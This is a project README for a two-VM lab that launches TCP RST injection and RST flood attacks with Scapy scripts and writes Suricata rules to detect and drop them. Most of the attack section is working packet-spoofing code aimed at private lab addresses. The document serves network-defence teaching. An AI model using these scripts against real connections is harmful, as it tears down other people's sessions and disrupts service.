# TCP RST Attack and Suricata Detection

## Overview

This project demonstrates a TCP Reset (RST) attack on a network and the configuration of Suricata to detect such malicious activities. The setup involves two virtual machines (VMs): one running a server script and Suricata (Kali Linux), and the other running client and attack scripts (Ubuntu). The project explores both active connection resets and excessive RST packet floods without active connections, showcasing the capability of Suricata to alert and drop suspicious packets.

## Features

- **Active Connection Reset**: Simulates a TCP RST attack by injecting RST packets into an established TCP connection.
- **RST Flood Attack**: Launches an excessive number of RST packets without active connections to simulate a Denial-of-Service (DoS) scenario.
- **Suricata Configuration**: Implements Suricata rules to detect and drop RST packets during active connections and excessive RST packet floods.
- **Packet Crafting**: Utilizes Scapy for crafting and sending custom TCP RST packets with specified sequence and acknowledgment numbers.

## Setup

### Prerequisites

- Two VMs (Kali Linux with Suricata and Ubuntu) connected to the same network.
- Python with Scapy installed on the attacking machine.
- Suricata installed and configured on the VM.

### Step-by-Step Setup

1. **Wireshark Setup (Kali VM)**:
   - Use Wireshark on the Kali VM to capture the TCP handshake between the client and server.
   - Apply the filter `tcp` to view only TCP packets.
   - Analyze the packets to identify the sequence and acknowledgment numbers for the active connection.
     
     ![r1](https://github.com/user-attachments/assets/68c19329-d9ea-4dac-abce-29fd9126080d)

2. **Server Script (Kali VM)**:

   Run the following server script to establish a TCP connection:

   ```python
   import socket

   server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   server_socket.bind(('0.0.0.0', 12345))  # Bind to all interfaces on port 12345
   server_socket.listen(1)  # Listen for incoming connections

   print("Server listening on port 12345...")
   conn, addr = server_socket.accept()
   print(f"Connection from {addr}")
   data = conn.recv(1024)
   print(f"Received: {data}")
   conn.close()
   ```
    
      ![r2](https://github.com/user-attachments/assets/48654b34-86e0-42cb-87b0-b394a7cf0c9d)

**2.Client Script (Ubuntu VM):**

Run the following client script to connect to the server:

```python
import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.100.50', 12345))  # Replace with the server VM's IP address
client_socket.sendall(b'Hello, server!')
client_socket.close()
```
![r3](https://github.com/user-attachments/assets/3d1731d1-01a9-4eef-8cf5-aeb7a1cfb73b)

![r4](https://github.com/user-attachments/assets/532019c6-8039-4bf7-aed0-3e33d07607db)

**3.Capture Sequence and Acknowledgment Numbers:**

Use the Wireshark capture to determine the sequence and acknowledgment numbers from the established connection. These numbers will be used in the attack scripts to craft valid RST packets.

![r5](https://github.com/user-attachments/assets/2583e578-bcaf-483a-adf2-53a50fcd61ed)

![r6](https://github.com/user-attachments/assets/301df6df-c08e-4492-a21a-788f222466a0)


## Attack Scripts

**Script 1: RST Packet Injection with Active Connection**
```python
from scapy.all import *

# IP addresses
src_ip = '192.168.100.51'  # Source IP address
dst_ip = '192.168.100.50'  # Destination IP address

# Port numbers
src_port = 12345  # Destination port from the original packet
dst_port = 47902  # Source port from the original packet

# Sequence and acknowledgment numbers
seq_num = 16      # Sequence number from the original packet
ack_num = 2       # Acknowledgment number from the original packet

# Create IP and TCP layers
ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=src_port, dport=dst_port, flags='R', seq=seq_num, ack=ack_num)

# Combine layers into a single packet
rst_packet = ip/tcp

# Send the RST packet
send(rst_packet)
```

![r7](https://github.com/user-attachments/assets/ba1b5969-3f6a-45bd-845e-4ed5a052d408)

![r8](https://github.com/user-attachments/assets/f84cba4a-e555-4940-b2bc-c61669e0b0ac)

![r9](https://github.com/user-attachments/assets/17353f47-732c-4284-ae0f-30d261acc02a)

**Script 2: RST Flood Attack without Active Connection**
```python
from scapy.all import *
import time

# Define the target IP and port
target_ip = "192.168.100.50"  # IP of your VM running Suricata
target_port = 80  # Target port

# Define the number of packets and interval
packet_count = 15  # Number of packets to send
interval = 0.1     # Interval between packets

# Create and send TCP RST packets
print(f"Starting RST flood attack on {target_ip}:{target_port}")
for i in range(packet_count):
    pkt = IP(dst=target_ip) / TCP(dport=target_port, flags="R")
    send(pkt, verbose=0)
    print(f"Sent RST packet {i+1}/{packet_count}")
    time.sleep(interval)

print("Attack completed.")
```

![r10](https://github.com/user-attachments/assets/9b9c3048-0d40-4364-8c77-ecdb49f180d5)

![r11](https://github.com/user-attachments/assets/da591d17-ab66-4257-a48f-a104b2fbd0e0)

**Script 3: RST Flood Attack with Active Connection**
```python

from scapy.all import *
import time

# Define the target IP and port
target_ip = "192.168.100.50"  # IP of your server
target_port = 12345          # Server's port

# Define the source IP and port
source_ip = "192.168.100.51"  # IP of the attacking machine
source_port = 54321           # Port used by the attacker

# Sequence and acknowledgment numbers from an established connection
seq_number = 1
ack_number = 1

# Define the number of packets and interval
packet_count = 15  # Number of packets to send
interval = 0.1     # Interval between packets

# Create and send TCP RST packets
print(f"Starting RST flood attack on {target_ip}:{target_port}")
for i in range(packet_count):
    pkt = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="R", seq=seq_number, ack=ack_number)
    send(pkt, verbose=0)
    print(f"Sent RST packet {i+1}/{packet_count}")
    time.sleep(interval)

print("Attack completed.")
```
![r12](https://github.com/user-attachments/assets/87207c1f-9fb7-4710-84ac-f4fb4da13a49)

![r13](https://github.com/user-attachments/assets/67d87041-b5e8-45dc-a483-8a49b7d0f7f9)


**Script 4: RST During Active connection**
```python
Script: 
from scapy.all import *

# Define the IP and TCP layer parameters
# Here, we specify the source IP address and destination IP address
src_ip = "192.168.100.51"
dst_ip = "192.168.100.50"

# Create an IP layer with the specified source and destination addresses
ip = IP(src=src_ip, dst=dst_ip)
print(f"IP Layer: {ip.summary()}")

# Define the TCP layer parameters
# Here, we specify the source port, destination port, and the TCP flag
src_port = 12345
dst_port = 12345
tcp_flag = "R"  # 'R' indicates a TCP Reset (RST) flag

# Create a TCP layer with the specified parameters
tcp = TCP(sport=src_port, dport=dst_port, flags=tcp_flag)
print(f"TCP Layer: {tcp.summary()}")

# Create the packet by stacking the IP and TCP layers
pkt = ip/tcp
print(f"Packet: {pkt.summary()}")
```
![r14](https://github.com/user-attachments/assets/5765319d-336e-4ffe-a856-6cc31fa325a5)

![r15](https://github.com/user-attachments/assets/0e407783-7cc5-45be-b759-4b0d331de40e)

**Script 5: RST Packet with Payload**
```python

from scapy.all import *

def send_rst_with_large_payload(target_ip, target_port):
    # Define a larger payload
    large_payload = b'\x00\x01\x02\x03' * 50  # 200 bytes of payload
    
    # Create a packet with RST flag and the large payload
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags='R', seq=1, ack=1) / Raw(load=large_payload)
    
    # Print packet details
    print(f"Sending packet to {target_ip}:{target_port}")
    print(f"Payload (first 50 bytes): {large_payload[:50]}")
    print(f"Packet details:\n{packet.show(dump=True)}")
    
    # Send the packet
    send(packet, verbose=1)  # Set verbose to 1 to see the packet details

# Replace with the IP address of your target
target_ip = "192.168.100.50"  # The IP address of the VM running Suricata
target_port = 80

send_rst_with_large_payload(target_ip, target_port)
```
![r16](https://github.com/user-attachments/assets/2c920390-4bc2-4d47-ac71-9cab2f05e32d)

![r17](https://github.com/user-attachments/assets/054812ea-0018-465e-812d-04b65038ce6a)

## Suricata Rules
**Detect TCP RST Packet:**

```plaintext

drop tcp any any -> $HOME_NET any (msg:"TCP RST Packet Detected"; flags:R; classtype:protocol-command-decode; sid:1000003; rev:1;)
```
**Detect Excessive TCP RST Packets:**

```plaintext

drop tcp any any -> $HOME_NET any (msg:"Excessive TCP RST Packets"; flags:R; threshold: type both, track by_src, count 10, seconds 20; classtype:attempted-dos; sid:2; rev:1;)
```
**Detect RST Packet During Active Connection:**

```plaintext

drop tcp $HOME_NET any -> $HOME_NET any (msg:"RST Packet During Active Connection"; flags:R; classtype:protocol-command-decode; sid:15; rev:1;)
```
**Detect RST Packet with Payload:**

```plaintext

drop tcp $HOME_NET any -> $HOME_NET any (msg:"RST Packet with Payload"; flags:R; content:"|00|"; classtype:policy-violation; sid:1000014; rev:1;)
drop tcp $HOME_NET any -> $HOME_NET any (msg:"RST Packet with Payload"; flags:R; content:!"|00 01 02 03|"; classtype:policy-violation; sid:1000013; rev:1;)
```
## Code Files
-[ServerScript.py](ServerScript.py)

-[ClientScript.py](ClientScript.py)

-[RSTInjectionScript.py](RSTInjectionScript.py)

-[RSTFloodScript.py](RSTFloodScript.py)

-[RSTFloodwithActiveConnectionScript.py](RSTFloodwithActiveConnectionScript.py)

-[RSTDuringActiveconnection.py](RSTDuringActiveconnection.py)

-[RSTPayloadScript.py](RSTPayloadScript.py)

## Contributions
Contributions to this project are not welcome. Please follow the guidelines below for contributions:

## License
This project is licensed under the Proprietary License. See the [LICENSE](LICENSE) file for details.


This documentation outlines the steps and code necessary to simulate TCP RST attacks and use Suricata to detect and respond to these threats, making it an educational resource for network security enthusiasts.

